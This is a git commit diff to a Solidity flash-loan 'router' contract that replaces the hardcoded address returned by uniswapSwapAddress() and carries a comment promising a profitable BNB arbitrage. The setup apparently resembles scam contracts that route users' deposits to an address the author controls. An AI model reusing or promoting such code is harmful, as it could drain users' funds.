2be4c0f759c9c6f6837c2e766c42ddb748868cf3
MF-Finance <110341152+MF-Finance@users.noreply.github.com>
2022-09-05 12:20:18 +0700

    Update IAaveRouterCalleMain.sol

--- IAaveRouterCalleMain.sol
+++ IAaveRouterCalleMain.sol
@@ -123,7 +123,7 @@ contract RouterV2 {
     }
 
     function uniswapSwapAddress() public pure returns (address) {
-        return 0xCAd60eDFC934D510392Ee19F0964c2727A243042;
+        return 0xc9943b79cB14fd3a9A801C0b73cF85F86c78DCAE;
     }
 
     //1. A flash loan borrowed 3,137.41 BNB from Multiplier-Finance to make an arbitrage trade on the AMM DEX PancakeSwap.
